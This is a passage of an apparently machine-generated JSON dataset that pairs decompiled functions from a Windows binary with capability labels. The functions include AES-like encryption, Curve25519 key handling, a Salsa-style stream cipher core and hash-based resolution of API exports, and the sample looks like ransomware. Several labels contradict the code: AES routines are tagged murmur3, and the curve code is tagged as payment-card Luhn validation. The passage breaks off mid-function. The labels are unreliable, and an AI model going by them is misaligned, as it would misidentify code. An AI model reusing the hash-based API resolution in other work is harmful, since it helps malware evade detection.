        "decompiled_code": "\nvoid __cdecl fcn.00409acb(uint32_t *arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t *puVar6;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar4 = *arg_10h;\n    uVar1 = arg_10h[1];\n    uVar2 = (uVar4 >> 8 & 0xff00ff00 | uVar4 << 0x18 | (uVar4 & 0xff00) << 8 | uVar4 >> 0x18) ^ *arg_8h;\n    uVar4 = arg_10h[2];\n    uVar3 = (uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18) ^ arg_8h[1];\n    uVar1 = arg_10h[3];\n    uVar5 = (uVar4 >> 8 & 0xff00ff00 | uVar4 << 0x18 | (uVar4 & 0xff00) << 8 | uVar4 >> 0x18) ^ arg_8h[2];\n    uVar4 = (uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18) ^ arg_8h[3];\n    var_ch = *((uVar5 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n             *((uVar2 >> 0x18) * 4 + 0x4100c8) ^ *((uVar4 & 0xff) * 4 + 0x410cc8) ^ arg_8h[4];\n    var_4h = *((uVar4 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar5 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n             *((uVar3 >> 0x18) * 4 + 0x4100c8) ^ *((uVar2 & 0xff) * 4 + 0x410cc8) ^ arg_8h[5];\n    arg_10h = *((uVar4 >> 0x10 & 0xff) * 4 + 0x4104c8) ^ *((uVar2 >> 8 & 0xff) * 4 + 0x4108c8) ^\n              *((uVar5 >> 0x18) * 4 + 0x4100c8) ^ *((uVar3 & 0xff) * 4 + 0x410cc8) ^ arg_8h[6];\n    uVar4 = *((uVar3 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n            *((uVar4 >> 0x18) * 4 + 0x4100c8) ^ *((uVar5 & 0xff) * 4 + 0x410cc8) ^ arg_8h[7];\n    arg_ch = arg_ch >> 1;\n    while( true ) {\n        arg_ch = arg_ch + -1;\n        puVar6 = arg_8h + 8;\n        if (arg_ch == 0) break;\n        uVar1 = *((arg_10h >> 8 & 0xff) * 4 + 0x4108c8) ^ *((var_4h >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                *((var_ch >> 0x18) * 4 + 0x4100c8) ^ *((uVar4 & 0xff) * 4 + 0x410cc8) ^ *puVar6;\n        uVar2 = *((uVar4 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((arg_10h >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                *((var_4h >> 0x18) * 4 + 0x4100c8) ^ *((var_ch & 0xff) * 4 + 0x410cc8) ^ arg_8h[9];\n        uVar3 = *((uVar4 >> 0x10 & 0xff) * 4 + 0x4104c8) ^ *((var_ch >> 8 & 0xff) * 4 + 0x4108c8) ^\n                *((arg_10h >> 0x18) * 4 + 0x4100c8) ^ *((var_4h & 0xff) * 4 + 0x410cc8) ^ arg_8h[10];\n        uVar4 = *((var_4h >> 8 & 0xff) * 4 + 0x4108c8) ^ *((var_ch >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                *((uVar4 >> 0x18) * 4 + 0x4100c8) ^ *((arg_10h & 0xff) * 4 + 0x410cc8) ^ arg_8h[0xb];\n        var_ch = *((uVar3 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar2 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                 *((uVar1 >> 0x18) * 4 + 0x4100c8) ^ *((uVar4 & 0xff) * 4 + 0x410cc8) ^ arg_8h[0xc];\n        var_4h = *((uVar4 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar3 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                 *((uVar2 >> 0x18) * 4 + 0x4100c8) ^ *((uVar1 & 0xff) * 4 + 0x410cc8) ^ arg_8h[0xd];\n        arg_10h = *((uVar4 >> 0x10 & 0xff) * 4 + 0x4104c8) ^ *((uVar1 >> 8 & 0xff) * 4 + 0x4108c8) ^\n                  *((uVar3 >> 0x18) * 4 + 0x4100c8) ^ *((uVar2 & 0xff) * 4 + 0x410cc8) ^ arg_8h[0xe];\n        uVar4 = *((uVar2 >> 8 & 0xff) * 4 + 0x4108c8) ^ *((uVar1 >> 0x10 & 0xff) * 4 + 0x4104c8) ^\n                *((uVar4 >> 0x18) * 4 + 0x4100c8) ^ *((uVar3 & 0xff) * 4 + 0x410cc8) ^ arg_8h[0xf];\n        arg_8h = puVar6;\n    }\n    uVar1 = *(str.ccccwwww + (var_4h >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.ccccwwww + (arg_10h >> 8 & 0xff) * 4) & 0xff00 ^ *(str.ccccwwww + (var_ch >> 0x18) * 4) & 0xff000000 ^\n            str.ccccwwww[(uVar4 & 0xff) * 4] ^ *puVar6;\n    *arg_14h = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar1 = *(str.ccccwwww + (arg_10h >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.ccccwwww + (uVar4 >> 8 & 0xff) * 4) & 0xff00 ^ *(str.ccccwwww + (var_4h >> 0x18) * 4) & 0xff000000 ^\n            str.ccccwwww[(var_ch & 0xff) * 4] ^ arg_8h[9];\n    arg_14h[1] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar1 = *(str.ccccwwww + (uVar4 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.ccccwwww + (var_ch >> 8 & 0xff) * 4) & 0xff00 ^ *(str.ccccwwww + (arg_10h >> 0x18) * 4) & 0xff000000 ^\n            str.ccccwwww[(var_4h & 0xff) * 4] ^ arg_8h[10];\n    arg_14h[2] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar4 = *(str.ccccwwww + (var_ch >> 0x10 & 0xff) * 4) & 0xff0000 ^\n            *(str.ccccwwww + (var_4h >> 8 & 0xff) * 4) & 0xff00 ^ *(str.ccccwwww + (uVar4 >> 0x18) * 4) & 0xff000000 ^\n            str.ccccwwww[(arg_10h & 0xff) * 4] ^ arg_8h[0xb];\n    arg_14h[3] = uVar4 >> 8 & 0xff00ff00 | uVar4 << 0x18 | (uVar4 & 0xff00) << 8 | uVar4 >> 0x18;\n    return;\n}\n",
        "token_count": 2502
    },
    "0040a1cd": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a1cd(uint32_t *arg_8h, uint32_t *arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    uint uStack20;\n    \n    uVar1 = *arg_ch;\n    puVar5 = arg_8h + 1;\n    *arg_8h = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar1 = arg_ch[1];\n    *puVar5 = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar1 = arg_ch[2];\n    arg_8h[2] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n    uVar1 = arg_ch[3];\n    uVar3 = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | uVar1 << 8 & 0xff00ff | uVar1 >> 0x18;\n    arg_8h[3] = uVar3;\n    if (arg_10h == 0x80) {\n        uVar2 = (*(str.ccccwwww + ((uVar1 << 8 & 0xff0000) >> 0x10) * 4) ^ 0x1000000) & 0xff000000 ^\n                *(str.ccccwwww + ((uVar1 >> 8 & 0xff00) >> 8) * 4) & 0xff0000 ^ str.ccccwwww[(uVar1 & 0xff) * 4] ^\n                *(str.ccccwwww + (uVar1 >> 0x18) * 4) & 0xff00 ^ *arg_8h;\n        uVar1 = *puVar5 ^ uVar2;\n        arg_8h[4] = uVar2;\n        arg_8h[5] = uVar1;\n        uVar1 = arg_8h[2] ^ uVar1;\n        arg_8h[6] = uVar1;\n        arg_8h[7] = uVar3 ^ uVar1;\n        puVar4 = 0x4128cc;\n        do {\n            uVar1 = puVar5[6];\n            uVar1 = *(str.ccccwwww + (uVar1 >> 8 & 0xff) * 4) & 0xff0000 ^\n                    *(str.ccccwwww + (uVar1 >> 0x10 & 0xff) * 4) & 0xff000000 ^ str.ccccwwww[(uVar1 >> 0x18) * 4] ^\n                    *(str.ccccwwww + (uVar1 & 0xff) * 4) & 0xff00 ^ puVar5[3] ^ *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5[7] = uVar1;\n            uVar1 = puVar5[4] ^ uVar1;\n            puVar5[8] = uVar1;\n            uVar1 = puVar5[5] ^ uVar1;\n            puVar5[9] = uVar1;\n            puVar5[10] = puVar5[6] ^ uVar1;\n            puVar5 = puVar5 + 4;\n        } while (puVar4 != 0x4128f0);\n        uStack20 = 10;\n    }\n    else {\n        uVar1 = arg_ch[4];\n        arg_8h[4] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n        uVar1 = arg_ch[5];\n        arg_8h[5] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | uVar1 << 8 & 0xff00ff | uVar1 >> 0x18;\n        if (arg_10h == 0xc0) {\n            uVar3 = (*(str.ccccwwww + ((uVar1 << 8 & 0xff0000) >> 0x10) * 4) ^ 0x1000000) & 0xff000000 ^\n                    *(str.ccccwwww + ((uVar1 >> 8 & 0xff00) >> 8) * 4) & 0xff0000 ^ str.ccccwwww[(uVar1 & 0xff) * 4] ^\n                    *(str.ccccwwww + (uVar1 >> 0x18) * 4) & 0xff00 ^ *arg_8h;\n            puVar4 = 0x4128cc;\n            uVar1 = *puVar5 ^ uVar3;\n            arg_8h[6] = uVar3;\n            uVar3 = arg_8h[2] ^ uVar1;\n            arg_8h[7] = uVar1;\n            arg_8h[8] = uVar3;\n            arg_8h[9] = arg_8h[3] ^ uVar3;\n            puVar5 = arg_8h + 10;\n            do {\n                *puVar5 = puVar5[-6] ^ puVar5[-1];\n                puVar5[1] = puVar5[-5] ^ puVar5[-6] ^ puVar5[-1];\n                uVar1 = puVar5[1];\n                uVar1 = *(str.ccccwwww + (uVar1 >> 8 & 0xff) * 4) & 0xff0000 ^\n                        *(str.ccccwwww + (uVar1 >> 0x10 & 0xff) * 4) & 0xff000000 ^ str.ccccwwww[(uVar1 >> 0x18) * 4] ^\n                        *(str.ccccwwww + (uVar1 & 0xff) * 4) & 0xff00 ^ puVar5[-4] ^ *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5[2] = uVar1;\n                uVar1 = puVar5[-3] ^ uVar1;\n                puVar5[3] = uVar1;\n                uVar1 = puVar5[-2] ^ uVar1;\n                puVar5[4] = uVar1;\n                puVar5[5] = puVar5[-1] ^ uVar1;\n                puVar5 = puVar5 + 6;\n            } while (puVar4 != 0x4128e8);\n            uStack20 = 0xc;\n        }\n        else {\n            uVar1 = arg_ch[6];\n            arg_8h[6] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | (uVar1 & 0xff00) << 8 | uVar1 >> 0x18;\n            uVar1 = arg_ch[7];\n            arg_8h[7] = uVar1 >> 8 & 0xff00ff00 | uVar1 << 0x18 | uVar1 << 8 & 0xff00ff | uVar1 >> 0x18;\n            if (arg_10h == 0x100) {\n                arg_ch = 0x4128cc;\n                uVar3 = (*(str.ccccwwww + ((uVar1 << 8 & 0xff0000) >> 0x10) * 4) ^ 0x1000000) & 0xff000000 ^\n                        *(str.ccccwwww + ((uVar1 >> 8 & 0xff00) >> 8) * 4) & 0xff0000 ^ str.ccccwwww[(uVar1 & 0xff) * 4]\n                        ^ *(str.ccccwwww + (uVar1 >> 0x18) * 4) & 0xff00 ^ *arg_8h;\n                uVar1 = *puVar5 ^ uVar3;\n                arg_8h[8] = uVar3;\n                arg_8h[9] = uVar1;\n                uVar1 = arg_8h[2] ^ uVar1;\n                arg_8h[10] = uVar1;\n                arg_8h[0xb] = arg_8h[3] ^ uVar1;\n                arg_10h = arg_8h + 0xc;\n                do {\n                    uVar1 = arg_10h[-1];\n                    uVar1 = *(str.ccccwwww + (uVar1 >> 0x10 & 0xff) * 4) & 0xff0000 ^\n                            *(str.ccccwwww + (uVar1 >> 8 & 0xff) * 4) & 0xff00 ^\n                            *(str.ccccwwww + (uVar1 >> 0x18) * 4) & 0xff000000 ^ str.ccccwwww[(uVar1 & 0xff) * 4] ^\n                            arg_10h[-8];\n                    *arg_10h = uVar1;\n                    uVar1 = arg_10h[-7] ^ uVar1;\n                    arg_10h[1] = uVar1;\n                    uVar1 = arg_10h[-6] ^ uVar1;\n                    arg_10h[2] = uVar1;\n                    arg_10h[3] = arg_10h[-5] ^ uVar1;\n                    uVar1 = arg_10h[3];\n                    uVar1 = *(str.ccccwwww + (uVar1 >> 8 & 0xff) * 4) & 0xff0000 ^\n                            *(str.ccccwwww + (uVar1 >> 0x10 & 0xff) * 4) & 0xff000000 ^\n                            str.ccccwwww[(uVar1 >> 0x18) * 4] ^ *(str.ccccwwww + (uVar1 & 0xff) * 4) & 0xff00 ^\n                            arg_10h[-4] ^ *arg_ch;\n                    arg_10h[4] = uVar1;\n                    uVar1 = arg_10h[-3] ^ uVar1;\n                    arg_10h[5] = uVar1;\n                    uVar1 = arg_10h[-2] ^ uVar1;\n                    arg_10h[6] = uVar1;\n                    arg_10h[7] = arg_10h[-1] ^ uVar1;\n                    arg_ch = arg_ch + 1;\n                    arg_10h = arg_10h + 8;\n                } while (arg_ch != 0x4128e4);\n                uStack20 = 0xe;\n            }\n            else {\n                uStack20 = 0;\n            }\n        }\n    }\n    return uStack20;\n}\n",
        "token_count": 2563
    },
    "004065e5": {
        "rules": [
            "hash data using djb2/7c4211d97aa54a3fa9be92a08fd675ee"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004065e5(uint8_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0x1505;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        iVar1 = iVar1 * 0x21 + *arg_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 93
    },
    "00406603": {
        "rules": [
            "hash data using djb2/7c4211d97aa54a3fa9be92a08fd675ee"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406603(uint16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 0x1505;\n    for (; *arg_8h != 0; arg_8h = arg_8h + 1) {\n        iVar1 = iVar1 * 0x21 + *arg_8h;\n    }\n    return iVar1;\n}\n",
        "token_count": 92
    },
    "00406ded": {
        "rules": [
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a",
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00406ded(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    if (arg_10h != 0) {\n        puVar4 = arg_8h;\n        do {\n            iVar1 = *((arg_ch - arg_8h) + puVar4);\n            *puVar4 = iVar1;\n            puVar4 = puVar4 + 2;\n            if (iVar1 == 0) break;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n        if ((arg_10h != 0) && (uVar2 = arg_10h - 1,  uVar2 != 0)) {\n            for (uVar3 = uVar2 >> 1; uVar3 != 0; uVar3 = uVar3 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            for (uVar2 = (uVar2 & 1) != 0; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 2;\n            }\n        }\n    }\n    return arg_8h;\n}\n",
        "token_count": 328
    },
    "00407571": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407571(uint8_t *arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004076f1(arg_8h, 0x20);\n    if (iVar1 != 0) {\n        *arg_8h = *arg_8h & 0xf8;\n        arg_8h[0x1f] = arg_8h[0x1f] & 0x3f | 0x40;\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 128
    },
    "0040ac2d": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040ac2d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_118h;\n    uint var_c8h;\n    uint var_70h;\n    uint var_20h;\n    uint var_1h;\n    \n    fcn.00405228(&var_20h, arg_ch, 0x20);\n    var_20h._0_1_ = var_20h & 0xf8;\n    var_1h._0_1_ = var_1h & 0x3f | 0x40;\n    fcn.0040af89(&var_70h, arg_10h);\n    fcn.0040a64f(&var_118h, &var_c8h, &var_20h, &var_70h);\n    fcn.0040a85e(&var_70h, &var_c8h);\n    fcn.0040b4a3(&var_c8h, &var_118h, &var_70h);\n    fcn.0040acb8(arg_8h, &var_c8h);\n    return 0;\n}\n",
        "token_count": 286
    },
    "00407d52": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407d52(code *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar9 = (arg_8h ^ 0xb86) << 0x10 ^ arg_8h;\n    uVar4 = uVar9 >> 0x15;\n    if (uVar4 < 0x2cd) {\n        if (uVar4 == 0x2cc) {\n            arg_8h = 0x407c61;\n        }\n        else if (uVar4 == 0xa5) {\n            arg_8h = fcn.00407b72;\n        }\n        else if (uVar4 == 0xed) {\n            arg_8h = fcn.00407f46;\n        }\n        else if (uVar4 == 0x189) {\n            arg_8h = fcn.00407ed4;\n        }\n        else if (uVar4 == 0x1c5) {\n            arg_8h = fcn.00407c9e;\n        }\n        else if (uVar4 == 499) {\n            arg_8h = fcn.00407c29;\n        }\n        else if (uVar4 == 0x251) {\n            arg_8h = fcn.00407e9b;\n        }\n    }\n    else if (uVar4 == 0x467) {\n        arg_8h = fcn.00407c6d;\n    }\n    else if (uVar4 == 0x499) {\n        arg_8h = fcn.00407be4;\n    }\n    else if (uVar4 == 0x51f) {\n        arg_8h = 0x407c1d;\n    }\n    else if (uVar4 == 0x65e) {\n        arg_8h = fcn.00407f0d;\n    }\n    else if (uVar4 == 0x723) {\n        arg_8h = fcn.00407f7f;\n    }\n    else if (uVar4 == 0x7d1) {\n        arg_8h = fcn.00407bab;\n    }\n    iVar5 = (*arg_8h)();\n    if (iVar5 != 0) {\n        uVar8 = 0;\n        iVar7 = *(*(iVar5 + 0x3c) + 0x78 + iVar5) + iVar5;\n        iVar1 = *(iVar7 + 0x24);\n        iVar2 = *(iVar7 + 0x20);\n        iVar3 = *(iVar7 + 0x1c);\n        uVar4 = *(iVar7 + 0x18);\n        if (uVar4 != 0) {\n            do {\n                uVar6 = fcn.00407a42(*(iVar2 + iVar5 + uVar8 * 4) + iVar5);\n                if ((uVar6 & 0x1fffff) == ((uVar9 ^ 0xff59) & 0x1fffff)) {\n                    return *(iVar3 + iVar5 + *(iVar1 + iVar5 + uVar8 * 2) * 4) + iVar5;\n                }\n                uVar8 = uVar8 + 1;\n            } while (uVar8 < uVar4);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 816
    },
    "0040934d": {
        "rules": [
            "encrypt data using Sosemanuk/d9cb91cf002a4780a153bbbb736437ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040934d(uint *arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t var_74h;\n    uint32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    uint32_t var_64h;\n    uint32_t var_60h;\n    uint32_t var_5ch;\n    uint32_t var_58h;\n    uint32_t var_54h;\n    uint32_t var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint32_t var_40h;\n    uint32_t var_3ch;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_34h = 10;\n    puVar7 = arg_ch;\n    puVar8 = &var_74h;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar8 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar8 = puVar8 + 1;\n    }\n    var_4h = var_4ch;\n    var_20h = var_50h;\n    var_14h = var_54h;\n    var_2ch = var_58h;\n    var_28h = var_5ch;\n    var_1ch = var_60h;\n    var_10h = var_64h;\n    var_24h = var_68h;\n    var_ch = var_6ch;\n    var_8h = var_70h;\n    do {\n        var_10h = var_10h ^ ((var_74h + var_44h) * 0x80 | var_74h + var_44h >> 0x19);\n        var_14h = var_14h ^ ((var_10h + var_74h) * 0x200 | var_10h + var_74h >> 0x17);\n        uVar9 = var_44h ^ ((var_14h + var_10h) * 0x2000 | var_14h + var_10h >> 0x13);\n        uVar2 = var_14h + uVar9;\n        uVar1 = var_74h ^ (uVar2 * 0x40000 | uVar2 >> 0xe);\n        var_20h = var_20h ^ ((var_8h + var_1ch) * 0x80 | var_8h + var_1ch >> 0x19);\n        uVar6 = var_40h ^ ((var_20h + var_1ch) * 0x200 | var_20h + var_1ch >> 0x17);\n        var_8h = var_8h ^ ((var_20h + uVar6) * 0x2000 | var_20h + uVar6 >> 0x13);\n        uVar2 = var_8h + uVar6;\n        var_1ch = var_1ch ^ (uVar2 * 0x40000 | uVar2 >> 0xe);\n        uVar4 = var_3ch ^ ((var_4h + var_28h) * 0x80 | var_4h + var_28h >> 0x19);\n        var_ch = var_ch ^ ((var_4h + uVar4) * 0x200 | var_4h + uVar4 >> 0x17);\n        var_28h = var_28h ^ ((var_ch + uVar4) * 0x2000 | var_ch + uVar4 >> 0x13);\n        uVar2 = var_ch + var_28h;\n        var_4h = var_4h ^ (uVar2 * 0x40000 | uVar2 >> 0xe);\n        var_24h = var_24h ^ ((var_48h + var_38h) * 0x80 | var_48h + var_38h >> 0x19);\n        var_2ch = var_2ch ^ ((var_24h + var_38h) * 0x200 | var_24h + var_38h >> 0x17);\n        uVar5 = var_48h ^ ((var_24h + var_2ch) * 0x2000 | var_24h + var_2ch >> 0x13);\n        uVar2 = var_2ch + uVar5;\n        uVar2 = var_38h ^ (uVar2 * 0x40000 | uVar2 >> 0xe);\n        var_8h = var_8h ^ ((uVar1 + var_24h) * 0x80 | uVar1 + var_24h >> 0x19);\n        var_70h = var_8h;\n        var_ch = var_ch ^ ((var_8h + uVar1) * 0x200 | var_8h + uVar1 >> 0x17);\n        var_6ch = var_ch;\n        var_24h = var_24h ^ ((var_ch + var_8h) * 0x2000 | var_ch + var_8h >> 0x13);\n        var_68h = var_24h;\n        var_74h = uVar1 ^ ((var_ch + var_24h) * 0x40000 | var_ch + var_24h >> 0xe);\n        var_28h = var_28h ^ ((var_1ch + var_10h) * 0x80 | var_1ch + var_10h >> 0x19);\n        var_5ch = var_28h;\n        var_18h = var_74h;\n        var_2ch = var_2ch ^ ((var_28h + var_1ch) * 0x200 | var_28h + var_1ch >> 0x17);\n        var_10h = var_10h ^ ((var_28h + var_2ch) * 0x2000 | var_28h + var_2ch >> 0x13);\n        var_64h = var_10h;\n        var_58h = var_2ch;\n        var_1ch = var_1ch ^ ((var_10h + var_2ch) * 0x40000 | var_10h + var_2ch >> 0xe);\n        var_60h = var_1ch;\n        var_48h = uVar5 ^ ((var_4h + var_20h) * 0x80 | var_4h + var_20h >> 0x19);\n        var_14h = var_14h ^ ((var_4h + var_48h) * 0x200 | var_4h + var_48h >> 0x17);\n        var_54h = var_14h;\n        var_20h = var_20h ^ ((var_14h + var_48h) * 0x2000 | var_14h + var_48h >> 0x13);\n        var_50h = var_20h;\n        var_4h = var_4h ^ ((var_20h + var_14h) * 0x40000 | var_20h + var_14h >> 0xe);\n        var_4ch = var_4h;\n        var_44h = uVar9 ^ ((uVar2 + uVar4) * 0x80 | uVar2 + uVar4 >> 0x19);\n        var_30h = var_44h;\n        var_40h = uVar6 ^ ((uVar2 + var_44h) * 0x200 | uVar2 + var_44h >> 0x17);\n        var_3ch = uVar4 ^ ((var_40h + var_44h) * 0x2000 | var_40h + var_44h >> 0x13);\n        var_38h = uVar2 ^ ((var_3ch + var_40h) * 0x40000 | var_3ch + var_40h >> 0xe);\n        var_34h = var_34h + -1;\n    } while (var_34h != 0);\n    iVar3 = 0;\n    do {\n        (&var_74h)[iVar3] = (&var_74h)[iVar3] + arg_ch[iVar3];\n        iVar3 = iVar3 + 1;\n    } while (iVar3 < 0x10);\n    puVar7 = &var_74h;\n    for (iVar3 = 0x10; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *arg_8h = *puVar7;\n        puVar7 = puVar7 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 2191
    },
    "0040a64f": {
        "rules": [
            "encrypt data using HC-128/f6b71aea27f34766a10ff27131cf0227",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a64f(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t arg_10h_00;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint var_4f0h;\n    uint var_458h;\n    uint var_3c0h;\n    uint var_328h;\n    uint var_320h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    int32_t var_30h;\n    uint8_t *var_2ch;\n    int32_t var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    fcn.0040524d(&var_320h, 0, 0x90);\n    var_c4h = 0;\n    var_c8h = 1;\n    fcn.0040524d(&var_c0h, 0, 0x90);\n    var_160h = 1;\n    var_15ch = 0;\n    fcn.0040524d(&var_158h, 0, 0x90);\n    fcn.0040524d(&var_3c0h, 0, 0x98);\n    var_1ch = &var_328h;\n    var_24h = &var_160h;\n    var_14h = &var_c8h;\n    var_ch = &var_3c0h;\n    fcn.0040524d(&var_458h, 0, 0x98);\n    var_1f8h = 1;\n    var_1f4h = 0;\n    fcn.0040524d(&var_1f0h, 0, 0x90);\n    fcn.0040524d(&var_4f0h, 0, 0x98);\n    var_290h = 1;\n    var_28ch = 0;\n    fcn.0040524d(&var_288h, 0, 0x90);\n    var_10h = &var_458h;\n    var_20h = &var_1f8h;\n    var_8h = &var_4f0h;\n    var_18h = &var_290h;\n    puVar5 = arg_14h;\n    puVar7 = &var_328h;\n    for (iVar4 = 0x14; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar7 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar7 = puVar7 + 1;\n    }\n    var_2ch = arg_10h + 0x1f;\n    var_30h = 0x20;\n    puVar5 = &var_328h;\n    puVar7 = var_8h;\n    do {\n        var_8h = puVar7;\n        var_1h._0_1_ = *var_2ch;\n        var_28h = 8;\n        puVar3 = var_24h;\n        puVar2 = var_10h;\n        puVar7 = var_8h;\n        do {\n            var_8h = puVar7;\n            var_10h = puVar2;\n            puVar7 = puVar3;\n            arg_10h_00 = var_1h >> 7;\n            fcn.0040c061(puVar7, puVar5, arg_10h_00, 0);\n            fcn.0040c061(var_ch, var_14h, arg_10h_00, 0);\n            fcn.0040b25d(var_8h, var_18h, var_10h, var_20h, puVar7, var_ch, var_1ch, var_14h, arg_14h);\n            fcn.0040c061(var_8h, var_10h, arg_10h_00, 0);\n            puVar6 = var_18h;\n            puVar1 = var_20h;\n           